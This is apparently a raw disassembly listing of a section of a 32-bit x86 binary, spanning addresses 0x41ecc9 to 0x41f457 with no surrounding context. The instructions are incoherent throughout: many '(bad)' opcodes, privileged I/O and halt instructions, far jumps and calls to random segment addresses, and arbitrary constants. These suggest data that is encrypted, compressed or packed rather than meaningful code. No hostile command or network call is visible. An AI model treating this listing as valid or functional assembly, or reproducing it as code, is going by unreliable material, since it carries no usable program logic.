  41ecc9:	shl    al,cl
  41eccb:	rol    BYTE PTR [ebx+0x4e],cl
  41ecce:	nop
  41eccf:	ins    BYTE PTR es:[edi],dx
  41ecd0:	(bad)  
  41ecd1:	dec    ebp
  41ecd2:	xchg   esi,eax
  41ecd3:	or     bl,cl
  41ecd5:	cmp    eax,0x9688aa99
  41ecda:	scas   eax,DWORD PTR es:[edi]
  41ecdb:	call   0xf102:0xa34f80c5
  41ece2:	mov    al,ds:0xeeffa14b
  41ece7:	dec    ebp
  41ece8:	and    edx,DWORD PTR [esi+0x529b55b6]
  41ecee:	jno    0x41ecd1
  41ecf0:	daa    
  41ecf1:	mov    dl,0xa
  41ecf3:	cli    
  41ecf4:	shr    BYTE PTR ds:0x8606a2c9,cl
  41ecfa:	or     eax,0x6e881c2b
  41ecff:	pop    ecx
  41ed00:	fdiv   st(4),st
  41ed02:	addr16 jmp 0xd129:0xc794aafd
  41ed0a:	and    BYTE PTR [ebx+ebx*2-0xd],0xc0
  41ed0f:	sub    al,0xa
  41ed11:	mov    esi,0xbc13d39c
  41ed16:	lods   eax,DWORD PTR ds:[esi]
  41ed17:	inc    esi
  41ed18:	hlt    
  41ed19:	adc    eax,0xa60a0758
  41ed1e:	dec    edx
  41ed1f:	mov    al,0xf9
  41ed21:	fiadd  WORD PTR [edx-0x9fd36c6]
  41ed27:	outs   dx,DWORD PTR ds:[esi]
  41ed28:	movsx  ebx,WORD PTR [edx-0x45d90213]
  41ed2f:	fsub   st(4),st
  41ed31:	scas   al,BYTE PTR es:[edi]
  41ed32:	loop   0x41ed18
  41ed34:	out    0xde,al
  41ed36:	fldcw  WORD PTR [ecx]
  41ed38:	pop    es
  41ed39:	call   0x12c48b1c
  41ed3e:	out    0xaf,al
  41ed40:	xchg   dl,al
  41ed42:	sub    ch,ah
  41ed44:	(bad)  
  41ed45:	mov    bl,0x87
  41ed47:	mov    ds:0x2800b0ce,al
  41ed4c:	xor    al,0xeb
  41ed4e:	adc    bl,BYTE PTR [esi+0x10]
  41ed51:	pop    esi
  41ed52:	xchg   ebx,eax
  41ed53:	mov    edi,0x4317810a
  41ed58:	mov    cl,0xa9
  41ed5a:	ret    0xd32c
  41ed5d:	addr16 aaa 
  41ed5f:	jl     0x41eda7
  41ed61:	pop    ss
  41ed62:	nop
  41ed63:	and    BYTE PTR [eax+0x240302ba],ch
  41ed69:	pop    ss
  41ed6a:	push   ebx
  41ed6b:	cli    
  41ed6c:	sbb    edx,DWORD PTR [ebx]
  41ed6e:	stos   BYTE PTR es:[edi],al
  41ed6f:	fcomp  st(2)
  41ed71:	ficomp DWORD PTR [edx]
  41ed73:	retf   0x56c2
  41ed76:	sbb    BYTE PTR [eax],bh
  41ed78:	test   eax,0x8bbe3fc6
  41ed7d:	shl    DWORD PTR [ecx],1
  41ed7f:	mov    eax,ds:0x25c40e66
  41ed84:	cmp    BYTE PTR [ebx+ecx*1],dl
  41ed87:	dec    edi
  41ed88:	push   cs
  41ed89:	add    BYTE PTR [edx+0x30d7b4ef],bh
  41ed8f:	inc    edi
  41ed90:	fbld   TBYTE PTR [ebp+ebx*2+0x5d]
  41ed94:	or     al,0x50
  41ed96:	arpl   WORD PTR [edx-0x25],si
  41ed99:	xchg   ecx,eax
  41ed9a:	push   ecx
  41ed9b:	pop    ebp
  41ed9c:	cmp    al,0x36
  41ed9e:	ret    
  41ed9f:	mov    ebx,0x5a5b1610
  41eda4:	out    dx,eax
  41eda5:	push   ss
  41eda6:	cmp    esi,esi
  41eda8:	arpl   WORD PTR [ebx-0x4e561c42],bx
  41edae:	scas   al,BYTE PTR es:[edi]
  41edaf:	inc    edi
  41edb0:	sub    eax,0xd66afd1f
  41edb5:	aas    
  41edb6:	cld    
  41edb7:	jno    0x41ed75
  41edb9:	nop
  41edba:	cmp    BYTE PTR [ecx],dl
  41edbc:	cld    
  41edbd:	mov    esp,0xcded13f5
  41edc2:	retf   0xfb3
  41edc5:	scas   al,BYTE PTR es:[edi]
  41edc6:	outs   dx,BYTE PTR ds:[esi]
  41edc7:	and    BYTE PTR [eax+0x42],0xd0
  41edcb:	dec    esi
  41edcc:	jl     0x41ede9
  41edce:	mov    bh,0x4f
  41edd0:	fistp  WORD PTR gs:[eax+ebx*2]
  41edd4:	sbb    BYTE PTR [ecx-0xb],0x86
  41edd8:	mov    ah,0x14
  41edda:	jmp    0x131ae863
  41eddf:	rcl    BYTE PTR [edi+0x6],cl
  41ede2:	sbb    esi,esi
  41ede4:	lea    eax,[edi-0x7c]
  41ede7:	cld    
  41ede8:	jmp    0x41ed8c
  41edea:	mov    ebp,0xc4c1a67c
  41edef:	fild   QWORD PTR [esi]
  41edf1:	mov    bh,0xc1
  41edf3:	in     al,0xf8
  41edf5:	loope  0x41ee2b
  41edf7:	mov    esp,0xeb2fd902
  41edfc:	cs jno 0x41ee6a
  41edff:	dec    eax
  41ee00:	jne    0x41ee16
  41ee02:	xor    cl,BYTE PTR [edi]
  41ee04:	lea    edi,[edi]
  41ee06:	dec    BYTE PTR [edx-0x27]
  41ee09:	mov    esp,ebx
  41ee0b:	or     BYTE PTR ds:0x118a0f2f,dl
  41ee11:	into   
  41ee12:	loop   0x41ee1f
  41ee14:	iret   
  41ee15:	xor    ch,al
  41ee17:	sub    dl,dl
  41ee19:	inc    ecx
  41ee1a:	xor    eax,0x98b6d5fc
  41ee1f:	cmp    bl,ch
  41ee21:	arpl   cx,ax
  41ee23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee24:	push   esi
  41ee25:	sub    eax,0xe7cf2d71
  41ee2a:	mov    bh,ch
  41ee2c:	mov    eax,0x3a8b3635
  41ee31:	push   ebx
  41ee32:	rol    BYTE PTR ds:0x609591e0,1
  41ee38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee39:	in     eax,0x18
  41ee3b:	and    al,BYTE PTR [esi+0x36ed90f4]
  41ee41:	stc    
  41ee42:	sbb    eax,0xba1cbcee
  41ee47:	cmp    esi,DWORD PTR [edx]
  41ee49:	cld    
  41ee4a:	mov    eax,ds:0x1f607134
  41ee4f:	push   ecx
  41ee50:	pop    ebx
  41ee51:	push   0xffffff91
  41ee53:	aam    0xbd
  41ee55:	pop    eax
  41ee56:	fldenv [edi]
  41ee58:	push   ebx
  41ee59:	(bad)  
  41ee5a:	enter  0xe1b1,0x97
  41ee5e:	add    eax,0x3e5b3332
  41ee63:	add    al,0x4c
  41ee65:	pop    esi
  41ee66:	call   0xf2c6:0x26ccc9e3
  41ee6d:	jns    0x41eed2
  41ee6f:	into   
  41ee70:	out    0x14,eax
  41ee72:	mov    esi,0x5768df7e
  41ee77:	xor    BYTE PTR [edx],0xcd
  41ee7a:	outs   dx,DWORD PTR ds:[esi]
  41ee7b:	ja     0x41ee6f
  41ee7d:	mov    esp,0x29674f50
  41ee82:	mov    ebx,0xa84c1f76
  41ee87:	std    
  41ee88:	cmp    BYTE PTR [esi],bh
  41ee8a:	hlt    
  41ee8b:	cmp    al,0x65
  41ee8d:	xchg   BYTE PTR [ebp+0x237a7c6f],al
  41ee93:	fcmovnu st,st(7)
  41ee95:	cli    
  41ee96:	mov    eax,0x6cfd749b
  41ee9b:	aam    0x4b
  41ee9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee9e:	retf   0xc7ba
  41eea1:	xchg   DWORD PTR [ebp+ecx*1-0x4ccba49e],ebx
  41eea8:	imul   edi,DWORD PTR [edx+eax*8],0x64e7a8ba
  41eeaf:	push   0x9ac9722f
  41eeb4:	int    0xb6
  41eeb6:	push   ecx
  41eeb7:	ds jmp 0x41ee9d
  41eeba:	or     al,0x49
  41eebc:	xchg   ecx,esi
  41eebe:	imul   ecx,DWORD PTR [eax-0x5f],0x4b
  41eec2:	inc    edx
  41eec3:	stos   DWORD PTR es:[edi],eax
  41eec4:	ret    0x9fd0
  41eec7:	pop    esi
  41eec8:	aam    0x64
  41eeca:	ja     0x41ef39
  41eecc:	into   
  41eecd:	add    eax,0x8a10bd3d
  41eed2:	or     BYTE PTR ds:0x8d905dca,0xb9
  41eed9:	ins    DWORD PTR es:[edi],dx
  41eeda:	and    al,0x57
  41eedc:	cli    
  41eedd:	fistp  WORD PTR [edx+0x512c10ca]
  41eee3:	jmp    0x41eeb6
  41eee5:	sub    al,0x2a
  41eee7:	sub    dh,bl
  41eee9:	fidivr DWORD PTR ds:[edx+ebp*2+0x67ffdcbb]
  41eef1:	in     eax,dx
  41eef2:	add    DWORD PTR [esi],esp
  41eef4:	imul   ecx,DWORD PTR [esi],0xd5b8fda4
  41eefa:	jo     0x41ee91
  41eefc:	outs   dx,BYTE PTR ds:[esi]
  41eefd:	lahf   
  41eefe:	jae    0x41ef0e
  41ef00:	add    esp,ecx
  41ef02:	add    eax,0xfdda95b2
  41ef07:	sbb    cl,BYTE PTR ds:0x860dd6ad
  41ef0d:	mov    es:0x9adbe5e5,al
  41ef13:	jae    0x41ef65
  41ef15:	(bad)  
  41ef18:	mov    ah,0xd4
  41ef1a:	jno    0x41ef1c
  41ef1c:	popa   
  41ef1d:	pop    ss
  41ef1e:	pop    ds
  41ef1f:	sti    
  41ef20:	mov    ch,0x5e
  41ef22:	cld    
  41ef23:	mov    al,0xe5
  41ef25:	(bad)
  41ef28:	daa    
  41ef29:	push   0x57
  41ef2b:	xchg   edx,eax
  41ef2c:	jle    0x41eec8
  41ef2e:	adc    DWORD PTR [ebx+0x4071488f],eax
  41ef34:	push   ss
  41ef35:	inc    edx
  41ef36:	iret   
  41ef37:	inc    eax
  41ef38:	jmp    0x33e6c66f
  41ef3d:	or     eax,0xa373afcb
  41ef42:	mov    dl,0x13
  41ef44:	mov    edi,0xe70f8374
  41ef49:	(bad)  
  41ef4a:	jo     0x41ef34
  41ef4c:	push   ecx
  41ef4d:	shr    DWORD PTR [ecx+0x32],1
  41ef50:	cli    
  41ef51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef52:	and    eax,0x206154c0
  41ef57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef58:	adc    al,0x1a
  41ef5a:	mov    ch,0x3e
  41ef5c:	mov    eax,0x20c53f24
  41ef61:	xor    BYTE PTR [ebx-0x7e6fe688],cl
  41ef67:	cwde   
  41ef68:	aad    0xfc
  41ef6a:	addr16 nop
  41ef6c:	inc    BYTE PTR [esp+edi*8-0x79]
  41ef70:	adc    al,0x77
  41ef72:	pop    esp
  41ef73:	test   al,0xb1
  41ef75:	lahf   
  41ef76:	or     eax,0xeadbe1f5
  41ef7b:	or     eax,0x78b935c8
  41ef80:	pop    esi
  41ef81:	inc    esi
  41ef82:	or     BYTE PTR [edx-0x5e],dh
  41ef85:	lods   al,BYTE PTR ds:[esi]
  41ef86:	fistp  WORD PTR [ecx]
  41ef88:	push   ds
  41ef89:	fistp  DWORD PTR [edx-0x4bc3eb7e]
  41ef8f:	je     0x41efac
  41ef91:	fs jo  0x41ef83
  41ef94:	fimul  DWORD PTR [ebp+ebx*2-0x59]
  41ef98:	jae    0x41f012
  41ef9a:	dec    edx
  41ef9b:	sar    BYTE PTR [eax-0x5b],cl
  41ef9e:	in     eax,0x7f
  41efa0:	xchg   edi,eax
  41efa1:	mov    dl,0xb8
  41efa3:	popa   
  41efa4:	jmp    0x3357:0xad226546
  41efab:	mov    DWORD PTR [ecx],esi
  41efad:	push   esp
  41efae:	pop    esi
  41efaf:	frstor [eax]
  41efb1:	ins    BYTE PTR es:[edi],dx
  41efb2:	xchg   ebx,eax
  41efb3:	ins    BYTE PTR es:[edi],dx
  41efb4:	or     DWORD PTR [ebp+ebp*8+0x3f],ecx
  41efb8:	cmc    
  41efb9:	inc    eax
  41efba:	shl    DWORD PTR [esi+0xe],1
  41efbd:	push   es
  41efbe:	xor    DWORD PTR [esp+eax*8],esi
  41efc1:	ja     0x41ef6a
  41efc3:	sub    DWORD PTR [eax+ebx*2],ecx
  41efc6:	fwait
  41efc7:	(bad)  
  41efc8:	lods   al,BYTE PTR ds:[esi]
  41efc9:	sbb    al,0x1d
  41efcb:	push   0xfffffffd
  41efcd:	jne    0x41f046
  41efcf:	int3   
  41efd0:	aam    0xaa
  41efd2:	in     al,dx
  41efd3:	sti    
  41efd4:	mov    ds:0x2e433183,al
  41efd9:	add    ch,BYTE PTR [edx]
  41efdb:	cli    
  41efdc:	pop    edi
  41efdd:	pop    ecx
  41efde:	sbb    al,BYTE PTR [edx-0x59]
  41efe1:	mov    eax,DWORD PTR [ebx+ecx*8-0x68]
  41efe5:	xchg   esi,eax
  41efe6:	mov    ebp,0x83f55b17
  41efeb:	jmp    0x4228:0xe3674a1c
  41eff2:	sub    bl,0x1
  41eff5:	cmp    al,0x44
  41eff7:	into   
  41eff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eff9:	stos   BYTE PTR es:[edi],al
  41effa:	dec    edx
  41effb:	xor    DWORD PTR [bp-0xa],ebp
  41efff:	call   0x435d:0x22872a0a
  41f006:	sbb    ebx,esp
  41f008:	shl    ch,1
  41f00a:	xchg   BYTE PTR [esi-0x93cff97],bh
  41f010:	ins    BYTE PTR es:[edi],dx
  41f011:	push   ebx
  41f012:	js     0x41efe0
  41f014:	cmovne edx,DWORD PTR [esi-0x38]
  41f018:	or     esp,DWORD PTR [eax]
  41f01a:	mov    bl,0x5c
  41f01c:	in     al,0x76
  41f01e:	xchg   ecx,eax
  41f01f:	popf   
  41f020:	jnp    0x41f081
  41f022:	popa   
  41f023:	sar    bl,1
  41f025:	xor    eax,edi
  41f027:	jbe    0x41efc4
  41f029:	ja     0x41f08f
  41f02b:	mul    DWORD PTR [eiz*1+0xc125de5]
  41f032:	loop   0x41efd0
  41f034:	fldenv [ebx+0x511097b4]
  41f03a:	stos   DWORD PTR es:[edi],eax
  41f03b:	jo     0x41efec
  41f03d:	mov    esi,0x4adfce04
  41f042:	push   eax
  41f043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f044:	shl    esi,cl
  41f046:	add    eax,0x62b3c60
  41f04b:	pop    edx
  41f04c:	scas   eax,DWORD PTR es:[edi]
  41f04d:	(bad)  
  41f04e:	ror    ecx,1
  41f050:	iret   
  41f051:	push   0x335e9a2d
  41f056:	mov    cl,0xad
  41f058:	fisubr WORD PTR ds:0x30dd75a8
  41f05e:	(bad)  
  41f05f:	sahf   
  41f060:	fbld   TBYTE PTR [esp+eiz*2+0x33663cfd]
  41f067:	mov    edx,0x1ac2b3bf
  41f06c:	icebp  
  41f06d:	or     BYTE PTR [eax],dl
  41f06f:	pop    eax
  41f070:	add    bh,BYTE PTR [ebp+0x28]
  41f073:	je     0x41f01c
  41f075:	push   esp
  41f076:	popa   
  41f077:	pop    es
  41f078:	shr    DWORD PTR [ecx-0x6058695f],cl
  41f07e:	push   edx
  41f07f:	jmp    0xae1c:0x75a2a7cc
  41f086:	lods   eax,DWORD PTR ds:[esi]
  41f087:	add    cl,bh
  41f089:	dec    edx
  41f08a:	fistp  WORD PTR [edx]
  41f08c:	sahf   
  41f08d:	adc    BYTE PTR [ebx],cl
  41f08f:	mov    ebx,0xf966b50f
  41f094:	inc    eax
  41f095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f096:	in     al,0xc7
  41f098:	jnp    0x41f10a
  41f09a:	and    edi,DWORD PTR ds:0x5b58a7b6
  41f0a0:	das    
  41f0a1:	ret    
  41f0a2:	sysret 
  41f0a4:	xchg   ecx,eax
  41f0a5:	xchg   ebx,eax
  41f0a6:	aaa    
  41f0a7:	out    0xc1,al
  41f0a9:	sbb    eax,0x7137d2dc
  41f0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0af:	inc    esp
  41f0b0:	out    0x75,al
  41f0b2:	dec    ecx
  41f0b3:	fs pop edx
  41f0b5:	push   eax
  41f0b6:	ins    BYTE PTR es:[edi],dx
  41f0b7:	adc    DWORD PTR [esp+ebp*2],esp
  41f0ba:	adc    BYTE PTR [edx-0x7badf75f],dl
  41f0c0:	adc    al,0x10
  41f0c2:	jbe    0x41f0b9
  41f0c4:	imul   esp,edi,0xfc2b0a34
  41f0ca:	stos   DWORD PTR es:[edi],eax
  41f0cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cc:	sti    
  41f0cd:	(bad)  
  41f0ce:	lea    esp,[esi+0x510c159d]
  41f0d4:	jbe    0x41f111
  41f0d6:	retf   
  41f0d7:	or     BYTE PTR [ecx+eiz*8-0x51],al
  41f0db:	mov    al,0x7b
  41f0dd:	pop    ecx
  41f0de:	enter  0x1c5,0xaf
  41f0e2:	stos   BYTE PTR es:[edi],al
  41f0e3:	cdq    
  41f0e4:	les    ebx,FWORD PTR [edi+0x129b1af4]
  41f0ea:	push   ebx
  41f0eb:	add    eax,0x248ff957
  41f0f0:	mov    eax,0x2d756e78
  41f0f5:	pop    ecx
  41f0f6:	cmp    DWORD PTR [ecx+0x69],0xffffff97
  41f0fa:	cld    
  41f0fb:	retf   
  41f0fc:	mov    bh,0x4c
  41f0fe:	dec    edx
  41f0ff:	sbb    BYTE PTR [eax],ch
  41f101:	scas   al,BYTE PTR es:[edi]
  41f102:	xor    esp,esi
  41f104:	push   ebp
  41f105:	aam    0xb6
  41f107:	and    BYTE PTR [esi-0x150b9832],ch
  41f10d:	scas   eax,DWORD PTR es:[edi]
  41f10e:	inc    esi
  41f10f:	mov    esi,0x10e7de59
  41f114:	dec    edi
  41f115:	aam    0x4f
  41f117:	xor    al,0x62
  41f119:	jmp    0x82ff:0x5579157f
  41f120:	and    BYTE PTR ds:0x1e37b895,dh
  41f126:	cmp    BYTE PTR es:[eax-0x59ccbcc3],0x2e
  41f12e:	mov    ch,0x22
  41f130:	and    BYTE PTR [edx+0x4a540054],al
  41f136:	and    al,0x8a
  41f138:	fild   WORD PTR [edx+0x3db34c00]
  41f13e:	mov    ch,0xb
  41f140:	mov    ds:0x62ad9c82,eax
  41f145:	enter  0x3913,0x78
  41f149:	jo     0x41f189
  41f14b:	lods   al,BYTE PTR ds:[esi]
  41f14c:	and    edx,DWORD PTR [esi+0x2a]
  41f14f:	add    al,0x7f
  41f151:	fdivr  DWORD PTR [edx]
  41f153:	mov    ds:0xd4b737f,eax
  41f158:	aam    0xbf
  41f15a:	imul   eax,esp,0x4ceab460
  41f160:	inc    ebp
  41f161:	mov    cl,0xa0
  41f163:	bnd jl 0x41f1bf
  41f166:	jo     0x41f18f
  41f168:	sbb    edi,DWORD PTR ds:0x1b9180c5
  41f16e:	sub    BYTE PTR [esi+ebx*8+0x447c6642],ch
  41f175:	test   DWORD PTR gs:[ebx+0x2de51eae],ebx
  41f17c:	repnz inc ebp
  41f17e:	fld    DWORD PTR ds:0x93f40ca7
  41f184:	jnp    0x41f12b
  41f186:	push   0xf873c221
  41f18b:	cli    
  41f18c:	int3   
  41f18d:	outs   dx,DWORD PTR ds:[esi]
  41f18e:	add    edi,DWORD PTR [esi]
  41f190:	inc    edx
  41f191:	inc    ecx
  41f192:	fsubp  st(4),st
  41f194:	or     dl,BYTE PTR [edi-0x21]
  41f197:	cli    
  41f198:	xchg   esp,eax
  41f199:	jle    0x41f1f1
  41f19b:	xchg   BYTE PTR [ecx+0x5fd857f],al
  41f1a1:	cmp    esp,eax
  41f1a3:	mov    esp,0xecfc394b
  41f1a8:	dec    ebp
  41f1a9:	sub    DWORD PTR [ebx+0x4],esp
  41f1ac:	clc    
  41f1ad:	cmp    al,0xc9
  41f1af:	aas    
  41f1b0:	test   al,0xa1
  41f1b2:	and    al,ch
  41f1b4:	mov    ebx,0x8a39e6d2
  41f1b9:	mov    cl,0x8
  41f1bb:	std    
  41f1bc:	sbb    DWORD PTR [ebx-0x74b12cd3],edi
  41f1c2:	push   esp
  41f1c3:	dec    ebp
  41f1c4:	pmuludq mm2,QWORD PTR [ebx+0x7e]
  41f1c8:	add    al,0x2e
  41f1ca:	add    al,0x3f
  41f1cc:	mov    bl,BYTE PTR [ebp-0x1125969d]
  41f1d2:	icebp  
  41f1d3:	pop    eax
  41f1d4:	hlt    
  41f1d5:	fcom   QWORD PTR [eax-0x840255b]
  41f1db:	and    eax,0xc5959106
  41f1e0:	pop    eax
  41f1e1:	jp     0x41f1f6
  41f1e3:	aad    0xd7
  41f1e5:	sbb    al,0xdb
  41f1e7:	push   cs
  41f1e8:	fadd   DWORD PTR [esi]
  41f1ea:	clc    
  41f1eb:	dec    esi
  41f1ec:	int    0xa0
  41f1ee:	call   0xa37de952
  41f1f3:	(bad)  
  41f1f4:	jo     0x41f1f4
  41f1f6:	call   0x7e56088a
  41f1fb:	hlt    
  41f1fc:	xchg   BYTE PTR [eax],dl
  41f1fe:	and    al,BYTE PTR [edi-0x7cfd24d5]
  41f204:	xor    ch,bl
  41f206:	imul   eax,esi,0x603a3385
  41f20c:	cmp    bh,ah
  41f20e:	and    BYTE PTR ds:0x65913d5,ah
  41f214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f215:	sbb    edx,DWORD PTR [ecx]
  41f217:	mov    al,0x73
  41f219:	data16 jge 0x41f233
  41f21c:	mov    eax,ds:0x66450823
  41f221:	fsub   DWORD PTR [edx]
  41f223:	jno    0x41f2a4
  41f225:	xchg   ecx,eax
  41f226:	or     al,bh
  41f228:	push   esp
  41f229:	or     BYTE PTR [ebp+0xd2c0e48],dl
  41f22f:	cmp    DWORD PTR [ebx],eax
  41f231:	int3   
  41f232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f233:	dec    esp
  41f234:	push   cs
  41f235:	mov    edi,0x5f6e319e
  41f23a:	or     BYTE PTR [ebp-0x6d5ad07c],dh
  41f240:	add    eax,esp
  41f242:	das    
  41f243:	cwde   
  41f244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f245:	xchg   ecx,eax
  41f246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f247:	push   ss
  41f248:	data16 and bh,BYTE PTR [ebx]
  41f24b:	imul   bl
  41f24d:	jb     0x41f20e
  41f24f:	push   ds
  41f250:	pop    esi
  41f251:	xor    BYTE PTR [esi+ebp*2-0x3],0xcb
  41f256:	add    al,BYTE PTR ds:0x4096a739
  41f25c:	xor    ebp,DWORD PTR [edx]
  41f25e:	sub    esp,DWORD PTR [edx+0x1d]
  41f261:	test   BYTE PTR [eax],0x44
  41f264:	mov    ds:0x7a865004,al
  41f269:	inc    ecx
  41f26a:	enter  0x425,0x16
  41f26e:	mov    bl,0x36
  41f270:	stc    
  41f271:	add    eax,0xf3e2c1c6
  41f276:	aaa    
  41f277:	scas   eax,DWORD PTR es:[edi]
  41f278:	or     bl,BYTE PTR [esi+eiz*4-0x46135578]
  41f27f:	and    edx,DWORD PTR [eax]
  41f281:	scas   eax,DWORD PTR es:[edi]
  41f282:	jne    0x41f2c6
  41f284:	jge    0x41f249
  41f286:	sub    al,0xe4
  41f288:	sbb    dh,bh
  41f28a:	in     al,0xe5
  41f28c:	mov    ds:0x42e5bb5c,eax
  41f291:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f293:	mov    esi,0x35d728fd
  41f298:	jae    0x41f2fb
  41f29a:	xchg   edx,eax
  41f29b:	push   0xffffffb1
  41f29d:	push   eax
  41f29e:	out    dx,al
  41f29f:	lods   eax,DWORD PTR ds:[esi]
  41f2a0:	mov    edi,0x77d674a6
  41f2a5:	jge    0x41f314
  41f2a7:	mov    bh,0x9e
  41f2a9:	and    dh,BYTE PTR ds:0xcd842658
  41f2af:	mov    esp,0xbdb293e9
  41f2b4:	adc    al,0xed
  41f2b6:	mov    ebp,0xa64b001f
  41f2bb:	ja     0x41f27c
  41f2bd:	sub    BYTE PTR [ecx-0xb],ah
  41f2c0:	or     al,0xa6
  41f2c2:	add    eax,0x8fa90efb
  41f2c7:	mov    ds:0x8a5a1604,al
  41f2cc:	push   eax
  41f2cd:	mov    cl,0x50
  41f2cf:	cmp    al,0xb8
  41f2d1:	out    0x92,eax
  41f2d3:	call   0x8773:0x53e89b27
  41f2da:	ins    BYTE PTR es:[edi],dx
  41f2db:	inc    edi
  41f2dc:	sahf   
  41f2dd:	cmp    DWORD PTR [ebx-0x71171db0],edi
  41f2e3:	ins    DWORD PTR es:[edi],dx
  41f2e4:	xor    dh,BYTE PTR [eax-0x52b8ade1]
  41f2ea:	mov    ch,0x2
  41f2ec:	call   0xdc38:0x5b740cb
  41f2f3:	pop    ss
  41f2f4:	out    dx,eax
  41f2f5:	cmp    ebp,ecx
  41f2f7:	fild   WORD PTR [ebx]
  41f2f9:	xchg   ecx,eax
  41f2fa:	scas   eax,DWORD PTR es:[edi]
  41f2fb:	cld    
  41f2fc:	push   0x75
  41f2fe:	push   0x17
  41f300:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f302:	pop    eax
  41f303:	adc    eax,0x26d998b6
  41f308:	push   esi
  41f309:	sub    eax,0xd6d016b6
  41f30e:	fpatan 
  41f310:	leave  
  41f311:	loop   0x41f34f
  41f313:	(bad)
  41f316:	jno    0x41f2d4
  41f318:	stc    
  41f319:	and    BYTE PTR [edi],dl
  41f31b:	mov    ds:0x3995248f,eax
  41f320:	(bad)  
  41f321:	pop    esp
  41f322:	(bad)  
  41f323:	pop    ecx
  41f324:	jns    0x41f36c
  41f326:	loopne 0x41f338
  41f328:	shl    DWORD PTR [eax-0x64],cl
  41f32b:	or     eax,0x578923c5
  41f330:	popa   
  41f331:	jle    0x41f359
  41f333:	mov    cs,WORD PTR [esi-0x66]
  41f336:	pop    esi
  41f337:	cli    
  41f338:	dec    ebp
  41f339:	xor    al,0xd7
  41f33b:	xor    al,0x1
  41f33d:	dec    ebx
  41f33e:	jg     0x41f390
  41f340:	arpl   WORD PTR [edx-0x4],si
  41f343:	jbe    0x41f333
  41f345:	mov    BYTE PTR [ecx-0x75b93ea6],bh
  41f34b:	cld    
  41f34c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f34d:	and    ebp,DWORD PTR [esi]
  41f34f:	lea    esp,[eax-0x30]
  41f352:	pop    edx
  41f353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f354:	sbb    ebp,DWORD PTR [edi+edx*8+0x78152236]
  41f35b:	pop    es
  41f35c:	mov    ds:0xdf32c6c9,eax
  41f361:	fs fst st(3)
  41f364:	mov    BYTE PTR [ecx+0x3abdafeb],0xcb
  41f36b:	test   bl,0xce
  41f36e:	test   eax,0x88d6cddb
  41f373:	arpl   WORD PTR [edi+0x33],di
  41f376:	ror    BYTE PTR fs:[edi],1
  41f379:	sub    eax,0x22e0b61d
  41f37e:	pop    esp
  41f37f:	repz imul ebp,DWORD PTR [esi-0x4d],0x55351ec8
  41f387:	add    BYTE PTR [ebx],dh
  41f389:	cmp    bl,al
  41f38b:	or     BYTE PTR [esi+edi*2],cl
  41f38e:	data16 xor bh,bh
  41f391:	xor    DWORD PTR [esi+0x22],edx
  41f394:	mov    ds:0x81b9ac94,eax
  41f399:	xchg   edx,eax
  41f39a:	call   0xdd3eec90
  41f39f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3a0:	dec    ecx
  41f3a1:	add    BYTE PTR [edx],0x80
  41f3a4:	push   eax
  41f3a5:	daa    
  41f3a6:	int    0x7e
  41f3a8:	cmp    al,0x8c
  41f3aa:	add    DWORD PTR ds:0x31bea1c2,edx
  41f3b0:	jl     0x41f3eb
  41f3b2:	or     edx,DWORD PTR [esi]
  41f3b4:	gs mov ch,0xe8
  41f3b7:	lods   al,BYTE PTR ds:[esi]
  41f3b8:	enter  0xfa2,0xaa
  41f3bc:	pop    es
  41f3bd:	fcomp  st(5)
  41f3bf:	iret   
  41f3c0:	sbb    bl,BYTE PTR [esi-0x68]
  41f3c3:	sar    esp,0x67
  41f3c6:	int    0x32
  41f3c8:	jmp    0x41f40f
  41f3ca:	leave  
  41f3cb:	pop    ecx
  41f3cc:	sbb    eax,0x4951b174
  41f3d1:	push   edx
  41f3d2:	or     al,0xf9
  41f3d4:	fmul   DWORD PTR [esi+0x45]
  41f3d7:	xor    eax,0x4a3e6274
  41f3dc:	sub    al,BYTE PTR [ebp-0x8f5eb82]
  41f3e2:	in     al,0xe9
  41f3e4:	cmp    ebx,esp
  41f3e6:	add    BYTE PTR [esi+0x73],ah
  41f3e9:	lea    eax,[ebx-0x193e6402]
  41f3ef:	mov    ecx,0xe5ac662e
  41f3f4:	xchg   esi,eax
  41f3f5:	mov    esp,0x5ae008a
  41f3fa:	sbb    eax,0x4b08bc6b
  41f3ff:	fidivr DWORD PTR [edx-0x113a6c7e]
  41f405:	sahf   
  41f406:	inc    ecx
  41f407:	ficomp WORD PTR [ecx+eiz*8+0x2409ea87]
  41f40e:	bnd jle 0x41f39b
  41f411:	stos   DWORD PTR es:[edi],eax
  41f412:	adc    al,0x2b
  41f414:	xlat   BYTE PTR ds:[ebx]
  41f415:	cdq    
  41f416:	shl    BYTE PTR ss:[ecx+0x23f8600b],0x3e
  41f41e:	push   0x7af33836
  41f423:	int    0xd6
  41f425:	(bad)  
  41f426:	retf   
  41f427:	cs dec ebx
  41f429:	sar    ch,cl
  41f42b:	push   cs
  41f42c:	call   0xeb73:0xc5247a1e
  41f433:	sub    eax,0xdc472bfe
  41f438:	xchg   DWORD PTR [ebp+ebx*4+0x56db1cbc],eax
  41f43f:	or     edx,DWORD PTR gs:0x1dda23e2
  41f446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f447:	mov    eax,ds:0xf6c7425e
  41f44c:	cmp    eax,0x87ab0b8d
  41f451:	add    esi,DWORD PTR [edi-0x2daa1b3f]
  41f457:	mov    bl,0x1b
